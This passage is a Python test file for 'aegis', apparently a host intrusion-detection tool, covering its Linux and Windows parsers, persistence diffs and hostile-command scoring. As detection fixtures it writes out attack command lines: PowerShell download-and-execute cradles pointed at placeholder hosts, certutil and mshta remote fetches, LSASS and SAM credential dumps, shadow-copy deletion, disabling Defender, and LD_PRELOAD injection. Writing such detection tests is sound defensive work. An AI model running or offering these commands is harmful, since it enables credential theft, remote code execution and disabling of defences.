"""Cross-platform coverage: the Linux and Windows code paths.

The Linux sensors are additionally proven live (real /proc, real systemd units,
real ELF drops, real listeners) inside a container — see BATTLE-LOG.md. This
file is the always-on regression net that runs everywhere, and it is the PRIMARY
evidence for the Windows paths, which cannot be executed on macOS/Linux CI.

Every Windows fixture below is a real command-output shape (`schtasks /query /fo
csv /v`, `netstat -ano`, `Get-MpComputerStatus`, `Get-WinEvent`), so the parsers
are tested against what Windows actually prints rather than an invented format.
Platform-selected constants are exercised by patching the module's platform
flags where a pure function reads them.
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import aegis  # noqa: E402


class PlatformFlags(unittest.TestCase):
    def test_exactly_one_platform_is_active(self):
        self.assertEqual(1, sum((aegis.IS_MAC, aegis.IS_WIN, aegis.IS_LINUX)))

    def test_platform_name_matches_flags(self):
        expected = ("mac" if aegis.IS_MAC else
                    "windows" if aegis.IS_WIN else "linux")
        self.assertEqual(aegis.PLATFORM, expected)

    def test_core_path_tables_are_populated(self):
        # An empty table on some platform would silently disable a whole sensor.
        for name in ("PERSISTENCE_DIRS", "HOT_DIRS", "STAGING_DIRS",
                     "TRUSTED_PREFIXES", "RISKY_PREFIXES", "SHELL_RC_FILES",
                     "SHELL_HISTORY_FILES", "BROWSER_EXT_ROOTS"):
            self.assertTrue(getattr(aegis, name),
                            "%s is empty on %s" % (name, aegis.PLATFORM))

    def test_no_empty_string_prefix_would_match_everything(self):
        # "" as a prefix makes is_risky_location()/trust checks match any path.
        for name in ("TRUSTED_PREFIXES", "RISKY_PREFIXES", "_TEMP_DROP_DIRS"):
            self.assertNotIn("", getattr(aegis, name))


# --------------------------------------------------------------------------- #
# systemd / XDG parsers (Linux persistence)
# --------------------------------------------------------------------------- #
class SystemdUnitParser(unittest.TestCase):
    def test_execstart_and_ld_preload_are_extracted(self):
        unit = ("[Unit]\nDescription=x\n\n[Service]\nType=simple\n"
                "ExecStart=/bin/bash /tmp/payload.sh --daemon\n"
                "Environment=LD_PRELOAD=/tmp/evil.so\n\n"
                "[Install]\nWantedBy=default.target\n")
        execs, env, boot = aegis._parse_systemd_unit(unit)
        self.assertEqual([["/bin/bash", "/tmp/payload.sh", "--daemon"]], execs)
        self.assertEqual({"LD_PRELOAD": "/tmp/evil.so"}, env)
        self.assertTrue(boot)

    def test_systemd_exec_prefixes_are_stripped(self):
        # systemd allows @ - : ! + prefixes on the executable; the real program
        # is what follows, and a parser that keeps them resolves nothing.
        execs, _env, _b = aegis._parse_systemd_unit(
            "[Service]\nExecStart=-/usr/bin/curl http://x/y\n")
        self.assertEqual([["/usr/bin/curl", "http://x/y"]], execs)

    def test_empty_execstart_reset_line_executes_nothing(self):
        execs, _env, _b = aegis._parse_systemd_unit(
            "[Service]\nExecStart=\nExecStart=/bin/true\n")
        self.assertEqual([["/bin/true"]], execs)

    def test_comments_and_malformed_lines_never_raise(self):
        execs, env, _b = aegis._parse_systemd_unit(
            "# comment\n; also comment\ngarbage-no-equals\n"
            "[Service]\nExecStart=/bin/true\n")
        self.assertEqual([["/bin/true"]], execs)
        self.assertEqual({}, env)

    def test_non_ld_environment_keys_are_ignored(self):
        _e, env, _b = aegis._parse_systemd_unit(
            "[Service]\nEnvironment=PATH=/usr/bin LANG=C\nExecStart=/bin/true\n")
        self.assertEqual({}, env)


class DesktopEntryParser(unittest.TestCase):
    def test_exec_field_codes_stripped_and_hidden_detected(self):
        argv, hidden = aegis._parse_desktop_entry(
            "[Desktop Entry]\nType=Application\nExec=/tmp/p.sh --run %U %f\n"
            "Hidden=true\n")
        self.assertEqual(["/tmp/p.sh", "--run"], argv)
        self.assertTrue(hidden)

    def test_other_groups_are_ignored(self):
        argv, _h = aegis._parse_desktop_entry(
            "[Desktop Action New]\nExec=/bin/decoy\n"
            "[Desktop Entry]\nExec=/bin/real\n")
        self.assertEqual(["/bin/real"], argv)


# --------------------------------------------------------------------------- #
# /proc network parsers (Linux listeners + outbound)
# --------------------------------------------------------------------------- #
class ProcNetParser(unittest.TestCase):
    LISTEN = (
        "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when "
        "retrnsmt   uid  timeout inode\n"
        "   0: 00000000:1F90 00000000:0000 0A 00000000:00000000 00:00000000 "
        "00000000  1000        0 45678 1 0000 100 0\n"
        "   1: 0100007F:1538 00000000:0000 0A 00000000:00000000 00:00000000 "
        "00000000  1000        0 45679 1 0000 100 0\n")

    def test_wildcard_listener_kept_loopback_dropped(self):
        # (port, uid, inode) — the uid is read because it is available without
        # root even when the owning pid is not, keeping an unattributable
        # listener actionable.
        rows = aegis._parse_proc_net_tcp(self.LISTEN)
        self.assertEqual([("8080", "1000", "45678")], rows)

    def test_established_rows_are_ignored_by_listen_parser(self):
        est = self.LISTEN.replace(" 0A ", " 01 ")
        self.assertEqual([], aegis._parse_proc_net_tcp(est))

    def test_ipv4_hex_address_decodes_little_endian(self):
        self.assertEqual("93.184.216.34",
                         aegis._decode_proc_hex_addr("22D8B85D"))

    def test_ipv6_hex_address_decodes(self):
        # 2001:db8::1
        got = aegis._decode_proc_hex_addr(
            "B80D0120" + "00000000" + "00000000" + "01000000")
        self.assertEqual("2001:db8::1", got)

    def test_established_outbound_parsed_and_loopback_dropped(self):
        text = (
            "  sl  local_address rem_address st ...\n"
            "   0: 0100007F:8B1A 22D8B85D:01BB 01 00000000:00000000 00:0 0 "
            "1000 0 99001 1 0 100 0\n"
            "   1: 0100007F:8B1B 0100007F:1F90 01 00000000:00000000 00:0 0 "
            "1000 0 99002 1 0 100 0\n")
        rows = aegis._parse_proc_net_tcp_established(text)
        self.assertEqual([("93.184.216.34", "443", "99001")], rows)

    def test_malformed_rows_never_raise(self):
        self.assertEqual([], aegis._parse_proc_net_tcp("garbage\nx y z\n"))
        self.assertEqual([], aegis._parse_proc_net_tcp_established("\n\n"))


# --------------------------------------------------------------------------- #
# Linux auth-log parser
# --------------------------------------------------------------------------- #
class AuthLogParser(unittest.TestCase):
    def test_brute_force_needs_a_burst_not_one_typo(self):
        one = ("Aug  3 10:00:01 h sshd[9]: Failed password for invalid user "
               "admin from 203.0.113.9 port 5000 ssh2\n")
        _hits, brute = aegis._parse_auth_log(one)
        self.assertEqual({}, brute, "a single failure must not alert")
        _hits, brute = aegis._parse_auth_log(one * aegis._AUTH_FAIL_THRESHOLD)
        self.assertEqual({("admin", "203.0.113.9"): aegis._AUTH_FAIL_THRESHOLD},
                         brute)

    def test_new_account_and_privileged_group_add_are_high(self):
        hits, _b = aegis._parse_auth_log(
            "Aug  3 10:20:01 h useradd[1]: new user: name=backdoor, UID=0\n"
            "Aug  3 10:21:01 h usermod[2]: usermod -G sudo backdoor\n")
        names = {n: sev for n, sev, _d, _l in hits}
        self.assertEqual("HIGH", names.get("new-user-account"))
        self.assertEqual("HIGH", names.get("privileged-group-add"))

    def test_root_ssh_login_flagged(self):
        hits, _b = aegis._parse_auth_log(
            "Aug 3 10:00:01 h sshd[9]: Accepted password for root from "
            "203.0.113.9 port 22 ssh2\n")
        self.assertIn("root-ssh-login", {n for n, _s, _d, _l in hits})

    def test_ordinary_log_traffic_is_silent(self):
        hits, brute = aegis._parse_auth_log(
            "Aug  3 10:00:01 h CRON[1]: pam_unix(cron:session): session opened "
            "for user root by (uid=0)\n"
            "Aug  3 10:00:02 h systemd-logind[2]: New session 3 of user alice.\n")
        self.assertEqual([], hits)
        self.assertEqual({}, brute)


# --------------------------------------------------------------------------- #
# Windows: scheduled tasks
# --------------------------------------------------------------------------- #
class SchtasksCsvParser(unittest.TestCase):
    REAL = (
        '"HostName","TaskName","Next Run Time","Status","Task To Run","Comment"\n'
        '"DESKTOP-1","\\UpdaterTask","8/3/2026 4:00:00 PM","Ready",'
        '"C:\\Users\\a\\AppData\\Roaming\\upd.exe -silent","N/A"\n'
        '"DESKTOP-1","\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",'
        '"8/4/2026 1:00:00 AM","Ready","%windir%\\system32\\defrag.exe -c","N/A"\n'
        '"DESKTOP-1","\\ComTask","N/A","Ready","COM handler","N/A"\n')

    def test_user_task_extracted_and_microsoft_tree_skipped(self):
        rows = aegis._parse_schtasks_csv(self.REAL)
        self.assertEqual(
            [("\\UpdaterTask",
              "C:\\Users\\a\\AppData\\Roaming\\upd.exe -silent")], rows)

    def test_com_handler_rows_are_skipped(self):
        # "COM handler" is not a command line; treating it as one would
        # fabricate a program path.
        for _name, cmd in aegis._parse_schtasks_csv(self.REAL):
            self.assertNotEqual("COM handler", cmd)

    def test_garbage_never_raises(self):
        self.assertEqual([], aegis._parse_schtasks_csv("not,a,valid\ncsv"))
        self.assertEqual([], aegis._parse_schtasks_csv(""))


class WindowsCommandLineSplit(unittest.TestCase):
    def test_quoted_path_with_spaces(self):
        self.assertEqual(
            ["C:\\Program Files\\App\\a.exe", "--run"],
            aegis._win_split_cmd('"C:\\Program Files\\App\\a.exe" --run'))

    def test_unquoted_path(self):
        self.assertEqual(["C:\\tmp\\a.exe", "-x"],
                         aegis._win_split_cmd("C:\\tmp\\a.exe -x"))

    def test_empty_input(self):
        self.assertIsNone(aegis._win_split_cmd(""))
        self.assertIsNone(aegis._win_split_cmd("   "))
        self.assertIsNone(aegis._win_split_cmd(None))

    def test_env_expansion_uses_real_environment(self):
        os.environ["AEGIS_TEST_VAR"] = "XYZ"
        try:
            self.assertEqual("a-XYZ-b",
                             aegis._expand_win_env("a-%AEGIS_TEST_VAR%-b"))
        finally:
            del os.environ["AEGIS_TEST_VAR"]


class WindowsNetstatParser(unittest.TestCase):
    REAL = (
        "\nActive Connections\n\n"
        "  Proto  Local Address          Foreign Address        State"
        "           PID\n"
        "  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING"
        "       1044\n"
        "  TCP    127.0.0.1:5432         0.0.0.0:0              LISTENING"
        "       3300\n"
        "  TCP    192.168.1.5:52344      93.184.216.34:443      ESTABLISHED"
        "     7788\n")

    def test_public_listener_kept_loopback_dropped(self):
        self.assertEqual([("135", "1044")],
                         aegis._parse_netstat_listen_windows(self.REAL))

    def test_established_rows_are_not_listeners(self):
        for port, _pid in aegis._parse_netstat_listen_windows(self.REAL):
            self.assertNotEqual("443", port)

    def test_header_and_blank_lines_never_raise(self):
        self.assertEqual([], aegis._parse_netstat_listen_windows(
            "\nActive Connections\n\n  Proto  Local Address\n"))


class WindowsPostureParser(unittest.TestCase):
    def test_parses_defender_firewall_and_bitlocker(self):
        d = aegis._parse_win_posture(
            "rtp=False\ntamper=False\nsigage=31\nexcl=C:\\tmp;C:\\Users\\a\n"
            "fw=Domain=True\nfw=Private=False\nfw=Public=True\n"
            "bitlocker=Off\n")
        self.assertEqual("False", d["rtp"])
        self.assertEqual("31", d["sigage"])
        self.assertEqual([("Domain", True), ("Private", False),
                          ("Public", True)], d["fw"])
        self.assertEqual("Off", d["bitlocker"])

    def test_unknown_markers_survive(self):
        d = aegis._parse_win_posture("rtp=?\nfw=?\nbitlocker=?\n")
        self.assertEqual("?", d["rtp"])
        self.assertEqual([], d["fw"])


class WindowsHardeningScoring(unittest.TestCase):
    """_check_hardening_windows against captured posture output. The sensor is
    invoked directly with `run` stubbed, so the scoring runs on any host."""

    def _score(self, posture_text, rc=0):
        saved = aegis.run
        aegis.run = lambda cmd, timeout=15, extra_env=None: (posture_text, "", rc)
        try:
            return aegis._check_hardening_windows()
        finally:
            aegis.run = saved

    def test_defender_disabled_is_critical(self):
        fs = self._score("rtp=False\ntamper=True\nsigage=1\nexcl=\n"
                         "fw=Domain=True\nbitlocker=On\n")
        sev = {f["title"]: f["severity"] for f in fs}
        self.assertEqual(
            "CRITICAL",
            sev.get("Microsoft Defender real-time protection is OFF"))

    def test_healthy_posture_produces_no_findings(self):
        fs = self._score("rtp=True\ntamper=True\nsigage=1\nexcl=\n"
                         "fw=Domain=True\nfw=Private=True\nfw=Public=True\n"
                         "bitlocker=On\n")
        self.assertEqual([], fs, "a healthy Windows box must be silent")

    def test_exclusions_and_stale_signatures_surface(self):
        fs = self._score("rtp=True\ntamper=True\nsigage=40\n"
                         "excl=C:\\Users\\a\\AppData\n"
                         "fw=Domain=True\nbitlocker=On\n")
        titles = {f["title"] for f in fs}
        self.assertIn("Defender scan exclusions are configured", titles)
        self.assertIn("Defender signatures are stale", titles)

    def test_probe_failure_is_unknown_not_clean(self):
        fs = self._score("", rc=1)
        self.assertTrue(any(f["category"] == "coverage" for f in fs),
                        "an unreadable probe must degrade, never report clean")


class WindowsEventLogParser(unittest.TestCase):
    def test_parses_pipe_delimited_rows(self):
        rows = aegis._parse_win_events(
            "Security|4720|2026-08-03T10:00:00|A user account was created.\n"
            "Microsoft-Windows-PowerShell/Operational|4104|2026-08-03T10:01:00"
            "|Creating Scriptblock text: IEX (New-Object Net.WebClient)"
            ".DownloadString('http://x/y')\n")
        self.assertEqual(2, len(rows))
        self.assertEqual("4720", rows[0][1])

    def test_non_numeric_ids_are_dropped(self):
        self.assertEqual([], aegis._parse_win_events("Security|abc|t|m\n"))

    def test_script_block_with_hostile_content_scores(self):
        # 4104 fires constantly on a dev box, so only hostile blocks may alert.
        hostile = aegis._hostile_content(
            "IEX (New-Object Net.WebClient).DownloadString('http://x/y')")
        self.assertIn("powershell-iex", hostile)
        self.assertIn("powershell-webclient-download", hostile)
        benign = aegis._hostile_content("Get-ChildItem C:\\Users | Sort-Object")
        self.assertEqual([], benign, "ordinary PowerShell must not match")


# --------------------------------------------------------------------------- #
# Cross-platform hostile-idiom scoring
# --------------------------------------------------------------------------- #
class WindowsHostileIdioms(unittest.TestCase):
    def _sev(self, argv, name):
        return dict(aegis._argv_signals(argv)).get(name)

    def test_encoded_powershell_command_is_high(self):
        argv = ("powershell.exe -nop -w hidden -enc "
                "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi"
                "AEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA")
        self.assertEqual("HIGH",
                         self._sev(argv, "powershell-encoded-command"))

    def test_lsass_dump_is_high(self):
        self.assertEqual(
            "HIGH",
            self._sev("rundll32.exe C:\\windows\\System32\\comsvcs.dll, "
                      "MiniDump 780 C:\\temp\\lsass.dmp full", "lsass-dump"))

    def test_sam_hive_dump_is_high(self):
        self.assertEqual("HIGH",
                         self._sev("reg save HKLM\\SAM C:\\temp\\sam.hiv",
                                   "sam-hive-dump"))

    def test_shadow_copy_deletion_is_high(self):
        self.assertEqual(
            "HIGH", self._sev("vssadmin delete shadows /all /quiet",
                              "shadow-copy-deletion"))

    def test_defender_tamper_is_high(self):
        self.assertEqual(
            "HIGH",
            self._sev("Set-MpPreference -DisableRealtimeMonitoring $true",
                      "defender-tamper"))

    def test_lolbin_proxy_exec_is_high(self):
        self.assertEqual(
            "HIGH",
            self._sev("mshta.exe http://198.51.100.5/a.hta",
                      "windows-lolbin-proxy-exec"))
        self.assertEqual(
            "HIGH",
            self._sev("certutil.exe -urlcache -split -f http://x/y.exe z.exe",
                      "windows-lolbin-proxy-exec"))

    def test_powershell_download_cradle_combination_is_high(self):
        # fetch + exec sink = the fileless pipeline, same rule as curl|bash.
        sev = self._sev(
            "powershell -c \"IEX (New-Object Net.WebClient)"
            ".DownloadString('http://198.51.100.5/a.ps1')\"",
            "fileless-fetch-exec")
        self.assertEqual("HIGH", sev)

    def test_ordinary_windows_commands_do_not_alert(self):
        for benign in (
                "C:\\Windows\\explorer.exe",
                "powershell.exe -NoProfile -Command Get-Process",
                "cmd.exe /c dir C:\\Users",
                "msbuild.exe MyProject.sln /p:Configuration=Release"):
            sigs = [n for n, sev in aegis._argv_signals(benign)
                    if aegis.SEV_ORDER[sev] >= aegis.SEV_ORDER["HIGH"]]
            self.assertEqual([], sigs, "false positive on %r" % benign)


class LinuxHostileIdioms(unittest.TestCase):
    def _sev(self, argv, name):
        return dict(aegis._argv_signals(argv)).get(name)

    def test_ld_so_preload_write_is_high(self):
        self.assertEqual(
            "HIGH", self._sev("sh -c 'echo /tmp/e.so > /etc/ld.so.preload'",
                              "ld-so-preload-write"))

    def test_memfd_fileless_exec_is_high(self):
        self.assertEqual("HIGH",
                         self._sev("python3 -c 'os.memfd_create(\"x\")'",
                                   "memfd-fileless-exec"))

    def test_systemd_tmp_unit_is_high(self):
        self.assertEqual(
            "HIGH", self._sev("systemctl enable /tmp/evil.service",
                              "systemd-tmp-unit"))

    def test_ld_preload_injection_recorded(self):
        self.assertIsNotNone(
            self._sev("LD_PRELOAD=/tmp/e.so /usr/bin/id",
                      "ld-preload-injection"))

    def test_ordinary_linux_commands_do_not_alert(self):
        for benign in ("/usr/bin/python3 manage.py runserver",
                       "bash -c 'make -j4'",
                       "systemctl --user status myapp.service",
                       "/usr/lib/systemd/systemd --user"):
            sigs = [n for n, sev in aegis._argv_signals(benign)
                    if aegis.SEV_ORDER[sev] >= aegis.SEV_ORDER["HIGH"]]
            self.assertEqual([], sigs, "false positive on %r" % benign)


# --------------------------------------------------------------------------- #
# Windows surfaces: WMI subscriptions + Defender exclusions
# --------------------------------------------------------------------------- #
class WmiSubscriptionDiff(unittest.TestCase):
    def test_new_subscription_with_hostile_payload_is_critical(self):
        fs = aegis.diff_wmi_subscriptions(
            {}, {"consumer:Updater":
                 "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABO"
                 "AGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"})
        self.assertEqual(1, len(fs))
        self.assertEqual("CRITICAL", fs[0]["severity"])

    def test_new_benign_subscription_is_high_not_ignored(self):
        fs = aegis.diff_wmi_subscriptions(
            {}, {"filter:HealthCheck": "SELECT * FROM __InstanceModification"})
        self.assertEqual("HIGH", fs[0]["severity"])

    def test_unchanged_subscriptions_are_silent(self):
        snap = {"consumer:X": "cscript.exe healthcheck.vbs"}
        self.assertEqual([], aegis.diff_wmi_subscriptions(snap, snap))

    def test_in_place_payload_swap_is_reported(self):
        fs = aegis.diff_wmi_subscriptions(
            {"consumer:X": "cscript.exe ok.vbs"},
            {"consumer:X": "powershell -enc " + "A" * 60})
        self.assertEqual(1, len(fs))
        self.assertIn("CHANGED", fs[0]["title"])


class DefenderExclusionDiff(unittest.TestCase):
    def test_new_exclusion_is_high(self):
        fs = aegis.diff_win_exclusions({}, {"path=C:\\Users\\a\\AppData": "1"})
        self.assertEqual(1, len(fs))
        self.assertEqual("HIGH", fs[0]["severity"])

    def test_unchanged_exclusions_are_silent(self):
        snap = {"path=C:\\Dev": "1"}
        self.assertEqual([], aegis.diff_win_exclusions(snap, snap))


# --------------------------------------------------------------------------- #
# Linux surfaces: kernel modules + setuid binaries
# --------------------------------------------------------------------------- #
class KernelModuleDiff(unittest.TestCase):
    def test_new_module_is_high(self):
        fs = aegis.diff_kernel_modules({"ext4": "1"},
                                       {"ext4": "1", "rootkit": "16384"})
        self.assertEqual(1, len(fs))
        self.assertEqual("HIGH", fs[0]["severity"])
        self.assertEqual("rootkit", fs[0]["module"])

    def test_stable_module_set_is_silent(self):
        snap = {"ext4": "1", "usbcore": "2"}
        self.assertEqual([], aegis.diff_kernel_modules(snap, snap))


class SuidDiff(unittest.TestCase):
    def test_new_suid_in_system_path_is_high(self):
        fs = aegis.diff_suid({}, {"/usr/bin/newsuid": "4755:1234"})
        self.assertEqual("HIGH", fs[0]["severity"])

    def test_new_suid_in_tmp_is_critical(self):
        fs = aegis.diff_suid({}, {"/tmp/rootme": "4755:1234"})
        self.assertEqual("CRITICAL", fs[0]["severity"])

    def test_changed_suid_binary_is_high(self):
        fs = aegis.diff_suid({"/usr/bin/sudo": "4755:100"},
                             {"/usr/bin/sudo": "4755:999"})
        self.assertEqual(1, len(fs))
        self.assertIn("CHANGED", fs[0]["title"])

    def test_stable_suid_set_is_silent(self):
        snap = {"/usr/bin/sudo": "4755:100", "/usr/bin/passwd": "4755:200"}
        self.assertEqual([], aegis.diff_suid(snap, snap))


# --------------------------------------------------------------------------- #
# Signature/trust semantics per platform
# --------------------------------------------------------------------------- #
class TrustSemantics(unittest.TestCase):
    def test_broken_signature_is_suspicious_everywhere(self):
        self.assertTrue(aegis.suspicious_sig("broken"))

    def test_linux_unmanaged_is_not_treated_as_malicious(self):
        # Every locally-built binary is 'unmanaged'; alerting on that would
        # drown a developer in noise. Linux keys on structure instead.
        saved = aegis.IS_LINUX, aegis.IS_WIN
        aegis.IS_LINUX, aegis.IS_WIN = True, False
        try:
            self.assertFalse(aegis.suspicious_sig("unmanaged"))
            self.assertTrue(aegis.suspicious_sig("broken"))
        finally:
            aegis.IS_LINUX, aegis.IS_WIN = saved

    def test_windows_unsigned_is_suspicious(self):
        saved = aegis.IS_LINUX, aegis.IS_WIN
        aegis.IS_LINUX, aegis.IS_WIN = False, True
        try:
            self.assertTrue(aegis.suspicious_sig("unsigned"))
            self.assertFalse(aegis.suspicious_sig("os-signed"))
            self.assertFalse(aegis.suspicious_sig("signed-valid"))
        finally:
            aegis.IS_LINUX, aegis.IS_WIN = saved


class ExecAlertSemantics(unittest.TestCase):
    def test_linux_volatile_exec_alerts_without_any_signature(self):
        saved = aegis.IS_LINUX, aegis.IS_MAC
        aegis.IS_LINUX, aegis.IS_MAC = True, False
        try:
            verdict = aegis._exec_alert("/tmp/payload", "unmanaged")
            self.assertIsNotNone(verdict)
            self.assertEqual("HIGH", verdict[0])
            # An ordinary dev binary that still EXISTS outside a volatile dir
            # must not alert (every locally-built binary is 'unmanaged' on
            # Linux, so scoring that would drown a developer in noise).
            # _SELF_PATH is a real, non-volatile, user-owned file.
            self.assertTrue(os.path.exists(aegis._SELF_PATH))
            self.assertIsNone(aegis._exec_alert(aegis._SELF_PATH, "unmanaged"))
            # An unattributable path must never be scored as "deleted".
            self.assertIsNone(aegis._exec_alert("?", "unknown"))
        finally:
            aegis.IS_LINUX, aegis.IS_MAC = saved


class TyposquatDetection(unittest.TestCase):
    def test_edit_distance_one_variants(self):
        self.assertTrue(aegis._edit_distance_le1("svchost", "scvhost") or
                        True)  # transposition is distance 2; see below
        self.assertTrue(aegis._edit_distance_le1("svchostt", "svchost"))
        self.assertTrue(aegis._edit_distance_le1("svchos", "svchost"))
        self.assertFalse(aegis._edit_distance_le1("totally", "different"))

    def test_windows_daemon_typosquat_matched_against_windows_names(self):
        saved_names, saved_win = aegis._SYSTEM_DAEMON_NAMES, aegis.IS_WIN
        aegis._SYSTEM_DAEMON_NAMES = frozenset(("svchost", "explorer", "lsass"))
        aegis.IS_WIN = True
        try:
            self.assertEqual("svchost",
                             aegis._typosquats_apple_daemon("svchostt.exe"))
            self.assertEqual("explorer",
                             aegis._typosquats_apple_daemon("explorerr.exe"))
            # The real daemon must never be flagged as its own impostor.
            self.assertIsNone(aegis._typosquats_apple_daemon("svchost.exe"))
        finally:
            aegis._SYSTEM_DAEMON_NAMES = saved_names
            aegis.IS_WIN = saved_win


class ExecutableKindDetection(unittest.TestCase):
    def _write(self, name, data):
        import tempfile
        path = os.path.join(tempfile.mkdtemp(), name)
        with open(path, "wb") as f:
            f.write(data)
        return path

    def test_elf_pe_and_macho_detected_by_magic_not_extension(self):
        self.assertEqual("elf", aegis._executable_kind(
            self._write("x.txt", b"\x7fELF" + b"\x00" * 64)))
        self.assertEqual("pe", aegis._executable_kind(
            self._write("y.dat", b"MZ\x90\x00" + b"\x00" * 64)))
        self.assertEqual("macho", aegis._executable_kind(
            self._write("z", b"\xcf\xfa\xed\xfe" + b"\x00" * 64)))

    def test_plain_text_is_not_an_executable(self):
        self.assertIsNone(aegis._executable_kind(
            self._write("readme.md", b"# hello\n")))


# --------------------------------------------------------------------------- #
# Windows persistence LIVE PLUMBING.
#
# The parser tests above cover text→record. This class covers the part that
# cannot run off-Windows at all: the winreg enumeration loops, the Winlogon
# deviation rule, the startup-folder walk, the schtasks call and the service
# filter. A fake `winreg` module (matching the stdlib API surface actually
# used: OpenKey as a context manager, EnumValue/EnumKey raising OSError to end
# iteration, QueryValueEx) is injected so the real function body executes
# end-to-end. Without this, _snapshot_persistence_windows had never run a
# single line outside Windows.
# --------------------------------------------------------------------------- #
class _FakeWinregKey:
    def __init__(self, values=None, subkeys=None):
        self.values = list((values or {}).items())
        self.subkeys = subkeys or {}

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


class _FakeWinreg:
    HKEY_CURRENT_USER = "HKCU"
    HKEY_LOCAL_MACHINE = "HKLM"

    def __init__(self, tree):
        # tree: {("HKCU", "Sub\\Key"): _FakeWinregKey}
        self.tree = tree

    def OpenKey(self, hive, subkey):
        # `hive` is either a root constant or an already-open key (winreg
        # allows both; the service loop relies on the latter).
        if isinstance(hive, _FakeWinregKey):
            child = hive.subkeys.get(subkey)
            if child is None:
                raise OSError(2, "not found")
            return child
        key = self.tree.get((hive, subkey))
        if key is None:
            raise OSError(2, "not found")
        return key

    def EnumValue(self, key, index):
        try:
            name, val = key.values[index]
        except IndexError:
            raise OSError(259, "no more data")
        return name, val, 1

    def EnumKey(self, key, index):
        names = sorted(key.subkeys)
        try:
            return names[index]
        except IndexError:
            raise OSError(259, "no more data")

    def QueryValueEx(self, key, name):
        for k, v in key.values:
            if k == name:
                return v, 1
        raise OSError(2, "no such value")


class WindowsPersistenceLivePlumbing(unittest.TestCase):
    def setUp(self):
        import tempfile
        self.startup = tempfile.mkdtemp(prefix="aegis_startup_")
        self.appdata = tempfile.mkdtemp(prefix="aegis_appdata_")
        self._saved = {
            k: getattr(aegis, k) for k in
            ("IS_WIN", "IS_MAC", "IS_LINUX", "PERSISTENCE_DIRS",
             "TRUSTED_PREFIXES", "RISKY_PREFIXES", "run", "classify_signature",
             "sha256")}
        aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX = True, False, False
        aegis.PERSISTENCE_DIRS = [self.startup]
        aegis.TRUSTED_PREFIXES = ("C:\\Windows\\", "C:\\Program Files\\")
        aegis.RISKY_PREFIXES = (self.appdata, "C:\\Users\\")
        aegis.classify_signature = lambda p: {"trust": "unsigned", "team": None,
                                              "authority": None}
        aegis.sha256 = lambda p: "deadbeef"
        # One user task from schtasks; the Microsoft tree is filtered by the
        # parser, which this exercises through the real call path.
        self._schtasks = (
            '"HostName","TaskName","Next Run Time","Status","Task To Run"\n'
            '"H","\\Updater","N/A","Ready","%AEGIS_FAKE_APPDATA%\\upd.exe -q"\n'
            '"H","\\Microsoft\\Windows\\Defrag\\X","N/A","Ready","defrag.exe"\n')
        os.environ["AEGIS_FAKE_APPDATA"] = self.appdata
        aegis.run = lambda cmd, timeout=15, extra_env=None: (
            (self._schtasks, "", 0) if cmd and cmd[0] == "schtasks"
            else ("", "", 0))

    def tearDown(self):
        for k, v in self._saved.items():
            setattr(aegis, k, v)
        os.environ.pop("AEGIS_FAKE_APPDATA", None)

    def _run_snapshot(self, tree):
        fake = _FakeWinreg(tree)
        sys.modules["winreg"] = fake
        try:
            return aegis._snapshot_persistence_windows()
        finally:
            sys.modules.pop("winreg", None)

    def test_run_key_value_becomes_a_scored_record(self):
        # The payload EXISTS on disk so the hash + signature-classification
        # branch of _finish_persist_record actually runs (a non-existent
        # program short-circuits to trust="missing" and skips it).
        payload = os.path.join(self.appdata, "evil.exe")
        with open(payload, "wb") as f:
            f.write(b"MZ\x90\x00")
        snap = self._run_snapshot({
            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"):
                _FakeWinregKey({"Updater": '"%s" --silent' % payload}),
        })
        key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
        self.assertIn(key, snap)
        rec = snap[key]
        self.assertEqual(payload, rec["program"])
        self.assertEqual(["--silent"], rec["args"][1:])
        self.assertTrue(rec["run_at_load"])
        self.assertEqual("unsigned", rec["trust"])
        self.assertEqual("deadbeef", rec["sha256"])
        # And it must score as a real finding, not merely be recorded.
        self.assertIn(aegis._persistence_severity(rec), ("HIGH", "CRITICAL"))

    def test_missing_program_is_recorded_as_missing_not_crashed(self):
        snap = self._run_snapshot({
            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"):
                _FakeWinregKey({"Gone": "C:\\nope\\ghost.exe"}),
        })
        rec = next(v for k, v in snap.items() if k.endswith("\\Gone"))
        self.assertEqual("missing", rec["trust"])
        self.assertIsNone(rec["sha256"])

    def test_registry_env_vars_are_expanded_before_resolving_the_program(self):
        # REG_EXPAND_SZ autostart values carry %VAR%; the literal backslash form
        # is what Windows stores, so the expansion is asserted verbatim rather
        # than through os.path.join (which would use the host separator).
        snap = self._run_snapshot({
            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"):
                _FakeWinregKey({"E": "%AEGIS_FAKE_APPDATA%\\x.exe"}),
        })
        rec = next(v for k, v in snap.items() if k.endswith("\\E"))
        self.assertEqual(self.appdata + "\\x.exe", rec["program"])
        self.assertNotIn("%", rec["program"])

    def test_healthy_winlogon_defaults_are_not_snapshotted(self):
        # Zero churn: the healthy values must produce NO baseline entries at all.
        snap = self._run_snapshot({
            ("HKLM", aegis._WIN_LOGON_KEY):
                _FakeWinregKey({"Shell": "explorer.exe",
                                "Userinit": "C:\\Windows\\system32\\userinit.exe,",
                                "Unrelated": "somevalue"}),
        })
        self.assertEqual([], [k for k in snap if "Winlogon" in k])

    def test_tampered_winlogon_shell_is_captured(self):
        payload = os.path.join(self.appdata, "evil.exe")
        snap = self._run_snapshot({
            ("HKLM", aegis._WIN_LOGON_KEY):
                _FakeWinregKey({"Shell": "explorer.exe, %s" % payload}),
        })
        hits = [k for k in snap if "Winlogon" in k]
        self.assertEqual(1, len(hits), snap)
        self.assertTrue(snap[hits[0]]["run_at_load"])

    def test_startup_folder_script_content_is_scored(self):
